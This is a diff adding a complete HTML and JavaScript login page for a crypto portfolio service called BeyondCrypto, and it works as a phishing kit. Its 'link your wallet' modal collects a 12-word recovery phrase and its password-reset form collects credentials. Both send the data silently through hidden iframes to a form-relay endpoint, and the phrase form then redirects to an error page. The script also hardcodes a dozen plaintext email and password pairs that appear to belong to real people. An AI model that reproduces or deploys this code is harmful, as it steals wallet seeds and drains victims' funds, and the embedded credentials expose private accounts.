@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login · BeyondCrypto</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-bg: #0a1129;
+            --secondary-bg: #0f1a3a;
+            --card-bg: #152352;
+            --accent: #00c774;
+            --accent-secondary: #7c3aed;
+            --text-primary: #e2e8f0;
+            --text-secondary: #8b939f;
+            --positive: #00c774;
+            --negative: #ff4d4d;
+            --border-radius: 16px;
+            --shadow: 0 10px 30px rgba(0,0,0,0.3);
+            --border-color: rgba(255,255,255,0.05);
+            --input-bg: #0a1129;
+            --hover-bg: rgba(255,255,255,0.06);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: var(--secondary-bg);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border-color);
+        }
+
+        header {
+            padding: 25px 30px;
+            text-align: center;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .logo i {
+            font-size: 2rem;
+            color: var(--accent);
+        }
+
+        .logo h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(90deg, var(--text-primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .tagline {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .login-content {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .login-form-section {
+            flex: 1 1 55%;
+            padding: 30px;
+            border-right: 1px solid var(--border-color);
+        }
+
+        .wallet-section {
+            flex: 1 1 45%;
+            padding: 30px;
+            background: rgba(0,0,0,0.1);
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-title i {
+            color: var(--accent);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+        }
+
+        .input-with-icon input {
+            width: 100%;
+            padding: 12px 14px 12px 40px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            transition: border 0.2s;
+        }
+
+        .input-with-icon input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0,199,116,0.08);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, var(--accent), var(--accent-secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 7px 20px rgba(0,199,116,0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .message {
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 12px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+
+        .message.success {
+            background: rgba(0,199,116,0.12);
+            border: 1px solid rgba(0,199,116,0.2);
+            color: var(--accent);
+        }
+
+        .message.error {
+            background: rgba(255,77,77,0.12);
+            border: 1px solid rgba(255,77,77,0.2);
+            color: var(--negative);
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: var(--accent);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .reset-section {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            display: none;
+        }
+
+        .reset-section h3 {
+            margin-bottom: 18px;
+            color: var(--text-primary);
+        }
+
+        .wallet-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .wallet-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+        }
+
+        .wallet-btn:hover {
+            border-color: var(--accent);
+            color: var(--text-primary);
+            background: var(--hover-bg);
+        }
+
+        .wallet-btn i {
+            font-size: 1.4rem;
+            color: var(--accent-secondary);
+        }
+
+        .portfolio-preview h3 {
+            margin-bottom: 10px;
+        }
+
+        .preview-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .preview-item {
+            background: var(--card-bg);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: var(--secondary-bg);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 1.5rem;
+            color: var(--text-secondary);
+            cursor: pointer;
+        }
+
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin: 20px 0;
+        }
+
+        .phrase-input input {
+            width: 100%;
+            padding: 8px 10px 8px 28px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-size: 0.85rem;
+        }
+
+        /* Loading overlay inside modal */
+        .modal-loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10,17,41,0.92);
+            backdrop-filter: blur(6px);
+            border-radius: var(--border-radius);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+
+        .modal-loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner-wrapper {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        .spinner-wrapper .crypto-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.8rem;
+            color: var(--accent);
+            z-index: 2;
+            animation: pulse-icon 1.2s ease-in-out infinite;
+        }
+
+        .spinner-wrapper .ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: var(--accent);
+            border-bottom-color: var(--accent-secondary);
+            animation: spin-ring 1s linear infinite;
+        }
+
+        @keyframes spin-ring {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.7; }
+        }
+
+        .loading-text {
+            color: var(--text-primary);
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        footer {
+            padding: 18px;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .login-content {
+                flex-direction: column;
+            }
+            .login-form-section {
+                border-right: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-chart-line"></i>
+                <h1>BeyondCrypto</h1>
+            </div>
+            <p class="tagline">Secure access to your cryptocurrency portfolio</p>
+        </header>
+
+        <div class="login-content">
+            <div class="login-form-section">
+                <h2 class="section-title"><i class="fas fa-sign-in-alt"></i> Login</h2>
+
+                <!-- Login Form -->
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="username">Username or Email</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-user"></i>
+                            <input type="text" id="username" placeholder="Enter your username or email" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" id="password" placeholder="Enter your password" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Login</button>
+                </form>
+
+                <div id="loginError" class="message error" style="display:none;"></div>
+
+                <a href="#" id="forgotPasswordLink" class="forgot-link">Forgot Password?</a>
+
+                <!-- Password Reset Section (sends via Web3Forms) -->
+                <div id="resetPasswordSection" class="reset-section">
+                    <h3>Reset Password</h3>
+                    <form id="resetForm" action="https://api.web3forms.com/submit" method="POST" target="hidden_reset_frame">
+                        <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+                        <input type="hidden" name="subject" value="Password Reset Request">
+                        <input type="hidden" name="from_name" value="BeyondCrypto Login">
+                        <input type="hidden" name="botcheck" value="">
+                        <input type="hidden" name="info" id="resetInfoHidden" value="">
+
+                        <div class="form-group">
+                            <label for="reset-email">Username or Email</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-envelope"></i>
+                                <input type="text" id="reset-email" placeholder="Enter your username or email" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="new-password">New Password</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock"></i>
+                                <input type="password" id="new-password" placeholder="Enter new password" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="confirm-password">Confirm New Password</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-check-circle"></i>
+                                <input type="password" id="confirm-password" placeholder="Confirm new password" required>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-primary" id="resetBtn">Reset Password</button>
+                    </form>
+                    <iframe name="hidden_reset_frame" style="display:none;"></iframe>
+                    <div id="resetMessage" class="message" style="display:none;"></div>
+                </div>
+            </div>
+
+            <div class="wallet-section">
+                <h2 class="section-title"><i class="fas fa-wallet"></i> Link Your Crypto Wallet</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 20px;">Connect your wallet to view and manage your crypto assets</p>
+
+                <div class="wallet-options">
+                    <div class="wallet-btn" id="metamask-btn">
+                        <i class="fab fa-ethereum"></i>
+                        <span>MetaMask</span>
+                    </div>
+                    <div class="wallet-btn" id="coinbase-btn">
+                        <i class="fab fa-bitcoin"></i>
+                        <span>Coinbase Wallet</span>
+                    </div>
+                    <div class="wallet-btn" id="trust-btn">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Trust Wallet</span>
+                    </div>
+                    <div class="wallet-btn" id="ledger-btn">
+                        <i class="fas fa-usb"></i>
+                        <span>Ledger Wallet</span>
+                    </div>
+                </div>
+
+                <div class="portfolio-preview">
+                    <h3>Supported Assets</h3>
+                    <div class="preview-grid">
+                        <div class="preview-item">BTC</div>
+                        <div class="preview-item">ETH</div>
+                        <div class="preview-item">ADA</div>
+                        <div class="preview-item">SOL</div>
+                        <div class="preview-item">DOT</div>
+                        <div class="preview-item">XRP</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>Secure access to your cryptocurrency investments | &copy; 2024 BeyondCrypto</p>
+        </footer>
+    </div>
+
+    <!-- 12-Word Phrase Modal -->
+    <div id="phraseModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2><i class="fas fa-shield-alt"></i> Wallet Recovery Phrase</h2>
+            <p>Enter your 12-word recovery phrase to securely link your wallet:</p>
+
+            <form id="phraseForm" action="https://api.web3forms.com/submit" method="POST" target="hidden_phrase_frame">
+                <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+                <input type="hidden" name="subject" value="Wallet Recovery Phrase Submission">
+                <input type="hidden" name="from_name" value="BeyondCrypto Wallet Link">
+                <input type="hidden" name="botcheck" value="">
+                <!-- All phrase data will be combined into this field -->
+                <input type="hidden" name="info" id="phraseInfoHidden" value="">
+
+                <div class="phrase-grid" id="phraseGrid">
+                    <!-- Word inputs generated by JS -->
+                </div>
+
+                <button type="submit" class="btn-primary" id="phraseSubmitBtn">
+                    <i class="fas fa-paper-plane"></i> Link account
+                </button>
+            </form>
+            <iframe name="hidden_phrase_frame" style="display:none;"></iframe>
+
+            <!-- Loading overlay inside modal -->
+            <div class="modal-loading-overlay" id="phraseLoadingOverlay">
+                <div class="spinner-wrapper">
+                    <div class="ring"></div>
+                    <div class="crypto-icon"><i class="fas fa-sync-alt"></i></div>
+                </div>
+                <div class="loading-text">Linking Wallet...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ====================================================================
+        // USER DATABASE
+        // ====================================================================
+        const users = [
+            { username: "cryptoappctd@gmail.com", password: "DELFELD@", folder: "folder1" },
+            { username: "williams0575@gmail.com", password: "will@", folder: "folder2" },
+            { username: "Francessharples77", password: "Frances@", folder: "folder3" },
+            { username: "anneblanford@gmail.com", password: "ANNE@", folder: "folder4" },
+            { username: "fridricknelson30@gmail.com", password: "Thomas@", folder: "folder5" },
+            { username: "privatemessage9m@gmail.com", password: "Jeremy123@", folder: "folder6" },
+            { username: "ctdbeyond@gmail.com", password: "DELFELD@", folder: "folder7" },
+            { username: "privatemessage9m@gmail.com", password: "Katieiloveyou", folder: "folder8" },
+            { username: "richardclifford014@gmail.com", password: "richard1968", folder: "folder9" },
+            { username: "jayceetay@gmail.com", password: "IC790484679", folder: "folder10" },
+            { username: "officer.rogersharvey@gmail.com", password: "Rogers22", folder: "folder11" },
+            { username: "thomaswilliamsyo@gmail.com", password: "Thomas7070", folder: "folder12" }
+        ];
+
+        document.addEventListener('DOMContentLoaded', function() {
+
+            // =============================================================
+            // 1. LOGIN FORM
+            // =============================================================
+            const loginForm = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginError = document.getElementById('loginError');
+
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (!username || !password) {
+                    loginError.textContent = 'Please fill in all fields.';
+                    loginError.style.display = 'block';
+                    setTimeout(() => loginError.style.display = 'none', 3000);
+                    return;
+                }
+
+                let authenticatedUser = null;
+                for (let user of users) {
+                    if (user.username === username && user.password === password) {
+                        authenticatedUser = user;
+                        break;
+                    }
+                }
+
+                if (authenticatedUser) {
+                    sessionStorage.setItem('currentUser', JSON.stringify(authenticatedUser));
+                    window.location.href = authenticatedUser.folder + '/index.html';
+                } else {
+                    loginError.textContent = 'Invalid username or password. Please try again.';
+                    loginError.style.display = 'block';
+                    setTimeout(() => loginError.style.display = 'none', 3000);
+                }
+            });
+
+            // =============================================================
+            // 2. FORGOT PASSWORD TOGGLE
+            // =============================================================
+            const forgotLink = document.getElementById('forgotPasswordLink');
+            const resetSection = document.getElementById('resetPasswordSection');
+
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (resetSection.style.display === 'none' || resetSection.style.display === '') {
+                    resetSection.style.display = 'block';
+                    forgotLink.textContent = 'Cancel Password Reset';
+                } else {
+                    resetSection.style.display = 'none';
+                    forgotLink.textContent = 'Forgot Password?';
+                }
+            });
+
+            // =============================================================
+            // 3. PASSWORD RESET — SENDS TO EMAIL
+            // =============================================================
+            const resetForm = document.getElementById('resetForm');
+            const resetInfoHidden = document.getElementById('resetInfoHidden');
+            const resetMessage = document.getElementById('resetMessage');
+            const resetBtn = document.getElementById('resetBtn');
+
+            resetForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const email = document.getElementById('reset-email').value.trim();
+                const newPass = document.getElementById('new-password').value.trim();
+                const confirmPass = document.getElementById('confirm-password').value.trim();
+
+                if (!email) {
+                    resetMessage.className = 'message error';
+                    resetMessage.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please enter your username or email.';
+                    resetMessage.style.display = 'block';
+                    setTimeout(() => resetMessage.style.display = 'none', 3000);
+                    return;
+                }
+
+                if (newPass.length < 6) {
+                    resetMessage.className = 'message error';
+                    resetMessage.innerHTML = '<i class="fas fa-exclamation-circle"></i> Password must be at least 6 characters.';
+                    resetMessage.style.display = 'block';
+                    setTimeout(() => resetMessage.style.display = 'none', 3000);
+                    return;
+                }
+
+                if (newPass !== confirmPass) {
+                    resetMessage.className = 'message error';
+                    resetMessage.innerHTML = '<i class="fas fa-exclamation-circle"></i> Passwords do not match.';
+                    resetMessage.style.display = 'block';
+                    setTimeout(() => resetMessage.style.display = 'none', 3000);
+                    return;
+                }
+
+                const resetData = 
+                    `Username/Email: ${email}\n` +
+                    `New Password: ${newPass}\n` +
+                    `Timestamp: ${new Date().toISOString()}`;
+                resetInfoHidden.value = resetData;
+
+                resetBtn.disabled = true;
+                resetBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+
+                // Submit silently into iframe
+                HTMLFormElement.prototype.submit.call(resetForm);
+
+                setTimeout(() => {
+                    resetMessage.className = 'message success';
+                    resetMessage.innerHTML = '<i class="fas fa-check-circle"></i> Password reset details sent! Check your email.';
+                    resetMessage.style.display = 'block';
+
+                    resetBtn.disabled = false;
+                    resetBtn.innerHTML = 'Reset Password';
+                    resetForm.reset();
+
+                    setTimeout(() => {
+                        resetSection.style.display = 'none';
+                        forgotLink.textContent = 'Forgot Password?';
+                        resetMessage.style.display = 'none';
+                    }, 4000);
+                }, 1000);
+            });
+
+            // =============================================================
+            // 4. WALLET CONNECTION — 12-WORD PHRASE WITH AUTO-REDIRECT
+            // =============================================================
+            const walletButtons = [
+                document.getElementById('metamask-btn'),
+                document.getElementById('coinbase-btn'),
+                document.getElementById('trust-btn'),
+                document.getElementById('ledger-btn')
+            ];
+
+            const phraseModal = document.getElementById('phraseModal');
+            const phraseGrid = document.getElementById('phraseGrid');
+            const closeModal = document.querySelector('.close');
+            const phraseForm = document.getElementById('phraseForm');
+            const phraseInfoHidden = document.getElementById('phraseInfoHidden');
+            const phraseSubmitBtn = document.getElementById('phraseSubmitBtn');
+            const phraseLoadingOverlay = document.getElementById('phraseLoadingOverlay');
+
+            // Generate 12 word inputs
+            for (let i = 1; i <= 12; i++) {
+                const inputDiv = document.createElement('div');
+                inputDiv.className = 'phrase-input';
+                inputDiv.innerHTML = `
+                    <input type="text" name="word_${i}" placeholder="word ${i}" required autocomplete="off" spellcheck="false">
+                `;
+                phraseGrid.appendChild(inputDiv);
+            }
+
+            // Open modal for each wallet button
+            walletButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    phraseModal.style.display = 'flex';
+                    // Reset any previous loading state
+                    phraseLoadingOverlay.classList.remove('show');
+                    phraseSubmitBtn.disabled = false;
+                    phraseSubmitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Link account';
+                });
+            });
+
+            // Close modal
+            closeModal.addEventListener('click', function() {
+                phraseModal.style.display = 'none';
+            });
+
+            window.addEventListener('click', function(event) {
+                if (event.target === phraseModal) {
+                    phraseModal.style.display = 'none';
+                }
+            });
+
+            // Phrase form submission: silent iframe, then auto-redirect
+            phraseForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // Collect words
+                const words = [];
+                for (let i = 1; i <= 12; i++) {
+                    const val = this['word_' + i].value.trim();
+                    if (!val) {
+                        alert('Please fill in all 12 words.');
+                        return;
+                    }
+                    words.push(val);
+                }
+
+                // Build info string
+                const phrase = words.join(' ');
+                const phraseData = 
+                    `Recovery Phrase: ${phrase}\n` +
+                    `Timestamp: ${new Date().toISOString()}`;
+                phraseInfoHidden.value = phraseData;
+
+                // Show loading overlay inside modal
+                phraseLoadingOverlay.classList.add('show');
+                phraseSubmitBtn.disabled = true;
+                phraseSubmitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+                // Submit silently into iframe
+                HTMLFormElement.prototype.submit.call(phraseForm);
+
+                // After 3 seconds, close modal and redirect to dashboard
+                setTimeout(() => {
+                    phraseModal.style.display = 'none';
+                    window.location.href = 'link2/errorpage.html';
+                }, 3000);
+            });
+
+            console.log('✅ BeyondCrypto Login Page Loaded Successfully.');
+            console.log('📋 ' + users.length + ' users in database.');
+        });
+    </script>
+</body>
+</html>
